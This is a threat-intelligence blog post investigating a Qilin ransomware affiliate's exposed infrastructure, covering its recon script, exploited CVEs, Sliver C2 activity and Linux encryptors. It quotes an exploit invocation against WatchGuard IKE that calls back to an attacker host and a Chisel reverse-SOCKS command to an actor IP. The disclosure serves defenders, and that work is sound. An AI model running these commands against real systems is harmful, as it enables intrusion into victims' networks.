# Overview

Qilin is a long-standing prolific Ransomware-as-a-Service (RaaS) group, active since late 2022, causing extreme real-life impact to sectors across the globe. [Ransomware.live](https://www.ransomware.live/group/qilin) reports that Qilin has had the most victims of any ransomware group in 2025 & 2026 to date (March). In total, per [Ransomware.live](https://www.ransomware.live/group/qilin), Qilin has compromised over 1,700 organisations. 

[![1](/assets/images/qilin/1.png){: .align-center .img-border}](/assets/images/qilin/1.png)
<p class="figure-caption">Ransomware.live - Qilin</p> 

When affiliate backed cybercriminal groups operate at such large scales, mistakes are bound to happen, this is only natural. On December 15th 2025, Ctrl-Alt-Intel identified a Qilin affiliate Operational Security (OPSEC) failure that led us down a deep rabbit-hole. By the end of this investigation we understood:

* Two countries this affiliate appeared to be targeting 
* At least 7 CVEs they have leveraged 
* Tooling they leveraged during operations
* Multiple indvidual organisations they compromised
* C2 Infrastructure they operated from

Like many ransomware groups, the affiliate we will be exposing today primarily gained access to victim organisations via the compromise of corporate VPN devices, specifically WatchGuard and Fortinet - deploying Sliver for C2 on these appliances - eventually leading to deployment of Qilin binaries targeting Linux/ESXi/Nutanix devices.  

Noteably, we also observed the threat actor deploy POCs for many other known vulnerabilities, which we will discuss later.   

> You may have noticed, we are publishing this blog many months since our initial discovery on December 2025. Upon identifying the actor, we shared these findings with law enforcement and other relevant CTI authorities, as the mistakes they were making appeared to be persistent. 

> Waiting to publish proved valuable - the threat actor made the same mistakes from August 2025 to March 2026 - giving us rare visibility into ransomware operations from 5 different C2 servers they exposed.

# Reconnaissance

The Qilin affiliated actor leveraged a custom FortiGate/FortiManager recon script `TargetInfoPrinter.py` to perform fingerprinting and reconnaissance. 

1. It first checks whether `TCP/541` is open, which helps confirm that **Fortinet management services (FGFM)** are exposed.
2. It then requests `/remote/login?lang=en` and extracts the `login.js?q=` value, giving the actor a quick web UI fingerprint.
3. The most interesting technique is that it downloads ``/fonts/ftnt-icons.woff`` and parses the font metadata to recover the internal head checksum. This gives the actor another way to differentiate Fortinet builds/versions.

It could allow the threat actor to answer the questions:

* Is this a Fortinet device?
* Is Fortinet management reachable?
* Which build or variant does it appear to be?

# Initial Access 

Evidence strongly suggests that this affiliate relied on known vulnerabilities for initial access:

* CVE-2025-9242 - [WatchGuard RCE](https://labs.watchtowr.com/yikes-watchguard-fireware-os-ikev2-out-of-bounds-write-cve-2025-9242/) 
* CVE-2025-14733 - [WatchGuard RCE](https://www.watchguard.com/wgrd-psirt/advisory/wgsa-2025-00027)
* CVE-2025-40554 - [SolarWinds HelpDesk Auth Bypass](https://nvd.nist.gov/vuln/detail/CVE-2025-40554)
* CVE-2025-59718 - [FortiOS Auth Bypass](https://nvd.nist.gov/vuln/detail/CVE-2025-59718)
* CVE-2025-60021 - [Apache bRPC RCE](https://nvd.nist.gov/vuln/detail/CVE-2025-60021)
* CVE-2026-24061 - [Telnet RCE](https://nvd.nist.gov/vuln/detail/CVE-2026-24061)
* CVE-2026-24423 - [SmarterTools SmarterMail RCE](https://nvd.nist.gov/vuln/detail/CVE-2026-24423)

The file `9242_exploit.py` was the watchTowr WatchGuard POC. From the evidence available to Ctrl-Alt-Intel, there was significant attempted exploitation of WatchGuard Firebox appliances. The threat actor attempted to exploit over **900 unique US or German IP addresses**, with intent of deploying Sliver C2 to these appliances. 

```bash
python3 9242_exploit.py --rhost <target> --rport 500 --lhost <callback IP> --lport 2007 --exploit
```

> In practical terms, the actor was targeting the WatchGuard IKE service on port 500 and forcing compromised appliances to connect back to actor-controlled infrastructure on port 2007, giving them a shell to work from - where they downloaded and executed their Sliver binary. 

Analysis of the Sliver C2 client history logs revealed a clear pattern that was repeated numerous times. 

1. Interact with the compromised WatchGuard appliance through a Sliver session.
2. Run `ps`, `getpid` and `ifconfig`, and in many cases `terminate <pid>`.
3. Traverse into `/etc/wg`, either directly or via `cd ..`, then `cd etc`, then `cd wg`.
4. In `/etc/wg`, they downloaded WatchGuard configuration `config.xml`
5. Traverse to `/bin`
6. Upload `fos` (renamed Chisel binary), make it executable `chmod fos 777`
7. Launch `execute -o /bin/fos client 185.196.11.235:<port> R:socks`.

# Command & Control Infrastructure

Recovered artefacts show that this affiliate operated a multi-layered C2 stack targeting edge-devices, built primarily around **Sliver**, leading to deployment of **Chisel** and lightweight Python reverse shells used as supporting access mechanisms.

Alongside Sliver, the affiliate staged Chisel binaries, including a renamed copy fos, which was used to establish reverse SOCKS tunnels from compromised edge devices back to actor-controlled infrastructure. This gave the threat actor a reliable pivoting mechanism into internal victim networks, rather than relying only on the initial appliance foothold.

# Qilin Linux Binaries

Across the 5 open-directories, Ctrl-Alt-Intel recovered 3 Qilin binaries `tron`, `qusar`, `sssd` from `194.59.30[.]9` & `kruss` from `185.196.11[.]23`. Ctrl-Alt-Intel assess with high-confidence these were named after the relevant organisations they targeted. 

> These Qilin binaries had the capability to encrypt ESXi, Nutanix AHV, and regular Linux/FreeBSD hosts  

These binaries were found on open-directories within the weeks prior to organisations with similar names being found on the Qilin blog (`ijzn3sicrcy7guixkzjkib4ukbiilwc3xhnmby4mcbccnsd7j2rekvqd[.]onion`). For example, organisations "Z-TRONIX" & "Quasar" were published on December 31st together:
